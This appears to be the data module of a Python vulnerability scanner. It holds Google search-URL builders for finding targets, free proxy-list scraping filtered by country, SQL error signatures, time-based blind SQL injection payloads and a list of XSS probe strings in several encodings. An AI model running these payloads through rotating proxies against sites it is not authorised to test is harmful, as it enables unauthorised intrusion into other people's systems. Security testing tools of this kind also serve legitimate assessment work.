###########################################################################
#                                                                         #
#                         GOOGLESEARCHER DATA                             #
#                                                                         #
###########################################################################

def get_google_xpath(i) :
    return ("//table[@id='mn']/tbody[@id='desktop-search']/tr/td[2]/div[1]/div[2]/div[2]/div/ol/li[%d]/h3/a/@href" % i)
def get_google_pageURL(query, start) :
    search = ("http://www.google.com/search?q=" + str(query) + "&start=" + str(start*10))
    return search

###########################################################################
#                                                                         #
#                             SCANNER DATA                                #
#                                                                         #
###########################################################################

google='google'
duckduckgo='duckduckgo'
supportedSearchEngines = [google, duckduckgo]


###########################################################################
#                                                                         #
#                             GETPROXY DATA                               #
#                                                                         #
###########################################################################

headers = { 'User-Agent' : 'Mozilla/5.0' }
url_http = 'http://free-proxy-list.net'
url_socks = 'http://socks-proxy.net'
path = '//table[@id="proxylisttable"]/tbody/tr'
myip = "111.111.111.111" #OBS! Set this yourself!
pingLINUX = "ping -c 1 -W 1 " #>/dev/null"
pingWINDOWS = "ping -n 1 " #>null

validCountries = ['RU', 'FR', 'GB', 'SE', 'NL', 'PL', 'DE', 'LT', 'LV', 'UA', 
                      'IT', 'IN', 'BG', 'EE', 'IR', 'TH', 'AM', 'TW', 'PT', 'AL', 
                      'AD', 'BE', 'BY', 'BA', 'CZ', 'DK', 'ES', 'FO', 'FI', 'GE',
                      'GI', 'GR', 'HU', 'HR', 'LU', 'PO', 'TR']


###########################################################################
#                                                                         #
#                      VULNERABILITY SCANNER DATA                         #
#                                                                         #
###########################################################################

errorStrings = ["SQL Syntax", "SQL SYNTAX", "SQL Error", "SQL Error", "SQL ERROR", "sql_"]

sleepCommands = ["-SLEEP(5000)", 
                 "-BENCHMARK(1000000000000000, rand())",
                 "; WAIT FOR DELAY '00:10:00'",
                 "'BEGIN DBMS_LOCK.SLEEP(15); END;--" ]
                 
#source: http://breakthesecurity.cysecurity.org/2012/02/complete-cross-site-scriptingxss-cheat-sheets-part-1.html
xssStrings = ['>"><script>alert("1VULN")</script>&',
              '<script>alert(“1VULN”)</script>',
              '<script>alert(‘1VULN’)</script>',
              '“><script>alert(“1VULN”)</script>',
              '<script>alert(/1VULN”)</script>',
              '<script>alert(/1VULN/)</script>',
              '<ScRiPt>alert("1VULN")</sCriPt>',
              '<IMG SRC=jAVasCrIPt:alert(‘1VULN’)>',
              '<IMG SRC=”javascript:alert(‘1VULN’);”>',
              '<IMG SRC=javascript:alert(&quot;1VULN&quot;)>',
              '<IMG SRC=javascript:alert(‘1VULN’)',
              '<<SCRIPT>alert(“1VULN”);//<</SCRIPT>',
              "'';!--\"<1VULN>=&{()}",
              "%27%27%3B%21%2D%2D%22%3C%31%56%55%4C%4E%3E%3D%26%7B%28%29%7D",
              "&#x27;&#x27;&#x3B;&#x21;&#x2D;&#x2D;&#x22;&#x3C;&#x31;&#x56;&#x55;&#x4C;&#x4E;&#x3E;&#x3D;&#x26;&#x7B;&#x28;&#x29;&#x7D;",
              "&#39&#39&#59&#33&#45&#45&#34&#60&#49&#86&#85&#76&#78&#62&#61&#38&#123&#40&#41&#125",
              "Jyc7IS0tIjwxVlVMTj49JnsoKX0="]

